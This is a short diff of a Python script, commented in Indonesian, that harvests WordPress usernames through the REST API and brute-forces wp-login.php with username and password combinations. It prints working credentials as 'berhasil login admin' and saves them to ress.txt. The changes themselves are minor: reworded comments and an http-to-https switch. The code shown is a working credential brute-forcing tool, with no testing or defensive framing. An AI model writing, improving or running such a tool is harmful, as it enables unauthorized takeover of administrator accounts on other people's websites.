@@ -2,7 +2,7 @@ import sys
 import requests
 from colorama import init, Fore
 
-# Inisialisasi colorama
+# Inisialisasi colorama untuk warna di terminal
 init(autoreset=True)
 
 # Fungsi untuk mengambil username dari REST API
@@ -22,7 +22,7 @@ def get_usernames(domain):
 
 # Fungsi untuk mencoba brute force login
 def brute_force_login(domain, usernames, passwords):
-    login_url = f"http://{domain}/wp-login.php"
+    login_url = f"https://{domain}/wp-login.php"
     for username in usernames:
         for password in passwords:
             data = {'log': username, 'pwd': password}
@@ -30,7 +30,7 @@ def brute_force_login(domain, usernames, passwords):
                 response = requests.post(login_url, data=data, timeout=10)
                 if "wp-admin" in response.url or "dashboard" in response.text:
                     result = f"https://{domain}/wp-login.php:{username}:{password} > berhasil login admin"
-                    print(Fore.GREEN + result)  # Teks hijau untuk berhasil
+                    print(Fore.GREEN + result)  # Warna hijau untuk keberhasilan
                     # Simpan hasil berhasil ke file ress.txt
                     with open('ress.txt', 'a') as file:
                         file.write(result + "\n")
